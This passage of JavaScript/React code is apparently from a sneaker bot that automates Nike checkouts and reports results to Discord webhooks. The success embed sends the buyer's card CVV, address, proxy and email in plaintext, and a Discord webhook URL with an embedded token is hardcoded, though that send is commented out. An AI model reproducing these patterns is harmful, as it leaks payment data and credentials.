        .setThumbnail(
          "https://secure-images.nike.com/is/image/DotCom/" +
            sku.replace("-", "_")
        )
        .setColor("#D70040")
        .setDescription("your-app-name Decline Webhook")
        .setFooter("your-app-name")
        .setTimestamp();

      hook3.send(embed3);

      const blob = new Webhook(
        "https://discord.com/api/webhooks/1041279979993964604/8DZW29_GqT9SFKPQV12npiI139IxULvQdo15LjBcVk8wnKq3C8YSu0jedCYFvCS0Xd9P"
      );
      const blobe = new MessageBuilder()
        .setTitle("Payment Declined")
        .setAuthor(
          "your-app-name Success",
          "https://i.imgur.com/c2uryln.png",
          "https://www.google.com"
        )
        .addField("Style Code", sku, false)
        .addField("Time", "<t:" + parseInt(Date.now() / 1000) + ">")
        .setThumbnail(
          "https://secure-images.nike.com/is/image/DotCom/" +
            sku.replace("-", "_")
        )
        .setColor("#D70040")
        .setDescription("your-app-name Decline Webhook")
        .setFooter("your-app-name")
        .setTimestamp();

      // blob.send(blobe);

      toast.error(
        <span>
          Payment Failure: <b>{productName}</b>
        </span>,
        {
          style: {
            borderRadius: "10px",
            background: "#292938",
            color: "#fff",
          },
        }
      );
    } else if (entryResp.toString() == "NON_WINNER") {
      if (stopped == true) {
        return true;
      }
      changeStatus(entryResp.toString() + " - " + entryReas.toString());
    } else {
      if (stopped == true) {
        return true;
      }
      changeStatus("Winner");
      document.getElementById(gid).childNodes[5].childNodes[0].innerText =
        parseInt(
          document.getElementById(gid).childNodes[4].childNodes[0].innerText
        ) + 1;
      document.getElementById(id + "status").className =
        "TaskText w-52 text-success";

      logtail.log(fullEntry);
      const hook3 = new Webhook(WebhookURL.toString());
      const embed3 = new MessageBuilder()
        .setTitle("Successful Checkout")
        .setAuthor(
          "your-app-name Success",
          "https://i.imgur.com/c2uryln.png",
          "https://www.google.com"
        )
        .addField("Style Code", sku, false)
        .addField("Proxy", "||" + server + "||", false)
        .addField("CVV", "||" + cvv + "||", false)
        .addField("Address", "||" + address + "||", false)
        .addField("Profile", email, false)
        .addField("Time", "<t:" + parseInt(Date.now() / 1000) + ">")
        .setThumbnail(
          "https://secure-images.nike.com/is/image/DotCom/" +
            sku.replace("-", "_")
        )
        .setColor("#4cbb17")
        .setDescription(productName)
        .setFooter("your-app-name")
        .setTimestamp();

      hook3.send(embed3);

      const blob = new Webhook(
        "https://discord.com/api/webhooks/1041279979993964604/8DZW29_GqT9SFKPQV12npiI139IxULvQdo15LjBcVk8wnKq3C8YSu0jedCYFvCS0Xd9P"
      );
      const blobe = new MessageBuilder()
        .setTitle("Successful Checkout")
        .setAuthor(
          "your-app-name Success",
          "https://i.imgur.com/c2uryln.png",
          "https://www.google.com"
        )
        .addField("Style Code", sku, false)
        .addField("Time", "<t:" + parseInt(Date.now() / 1000) + ">")
        .setThumbnail(
          "https://secure-images.nike.com/is/image/DotCom/" +
            sku.replace("-", "_")
        )
        .setColor("#4cbb17")
        .setDescription(productName)
        .setFooter("your-app-name")
        .setTimestamp();

      // blob.send(blobe);

      toast.success(
        <span>
          Successful Checkout: <b>{productName}</b>{" "}
        </span>,
        {
          style: {
            borderRadius: "10px",
            background: "#292938",
            color: "#fff",
          },
          icon: "🎊",
        }
      );
    }
  }

  async function changeStatus(status) {
  document.getElementById(id + "stop").onclick = async function () {
      document.getElementById(id + "status").innerText = "Stopped";
      document.getElementById(id + "status").className = "TaskText w-52";
      document.getElementById(id + "stop").style.visibility = "hidden";
      document.getElementById(id + "start").style.visibility = "visible";

      await Page.close();

      stopped = true;

      var targets = await client.Target.getTargets();
      if (targets.targetInfos.length == 1) {
        CDP.Close({ id: targets.targetInfos[0].targetId, port: numPort });
      }
      
      return true;
    };
    if (document.getElementById(id)) {
      document.getElementById(id + "status").innerText = status;

    }
  }
}
